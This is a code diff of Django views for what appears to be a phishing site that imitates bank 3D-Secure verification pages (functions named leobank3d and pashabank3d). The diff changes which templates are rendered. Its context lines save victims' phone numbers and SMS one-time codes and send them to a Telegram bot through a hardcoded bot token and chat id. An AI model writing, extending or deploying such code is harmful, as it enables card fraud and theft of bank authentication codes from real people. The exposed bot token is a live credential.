@@ -380,7 +380,7 @@ def leobank3d(request):
     
     if request.method == "POST":
         last_contact = ContactModel.objects.latest('created_at')
-        return render( request,'pages/loading.html' )
+        return render( request,'pages/error.html' )
     last_contact = ContactModel.objects.latest('created_at')
     
     context = {
@@ -389,7 +389,7 @@ def leobank3d(request):
     'cc': last_contact.cc[-4:],
     }
     
-    return render( request,'pages/unibank3d.html',context )
+    return render( request,'pages/erro.html',context )
 
 
 
@@ -454,6 +454,7 @@ def pashabank3d(request):
         number = str(last_contact.phone)
 
         context = {
+               "last_contact.bankname":"",
               'number': number[-4:],
               'amount': last_contact.amount,
               'cc': last_contact.cc[-4:],
@@ -477,7 +478,7 @@ def pashabank3d(request):
         last_contact.sms=concatenated
         last_contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
-        return render( request,'pages/loading.html' )
+        return render( request,'pages/loading.html',context )
     
     
     return render( request,'pages/loading.html' )
